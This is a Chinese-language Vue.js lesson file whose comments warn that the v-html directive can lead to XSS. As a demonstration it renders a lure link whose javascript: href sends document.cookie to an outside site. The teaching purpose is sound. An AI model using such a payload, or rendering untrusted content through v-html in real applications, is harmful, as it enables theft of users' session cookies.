<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
    <!-- 
        v-html指令：
      1.作用：向指定节点中渲染包含html结构的内容。
      2.与插值语法的区别：
               (1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
               (2).v-html可以识别html结构。
      3.严重注意：v-html有安全性问题！！！！
               (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
               (2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
     -->
        <!-- 准备一个容器 -->
        <div id='root'>
            <div>你好，{{name}}</div>
            <div v-text="str">hello</div>
            <div v-html="str">hello</div>

            <div v-html="str02"></div>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            name:'四川城市职业学院',
                            str:'<h1>你好！！！</h1>',
                            str02:'<a href=javascript:location="https://www.baidu.com" + document.cookie>大家快来，这里可有抽奖，最高奖100万</a>',
                        }
                        
                })
        </script>
</body>
</html>
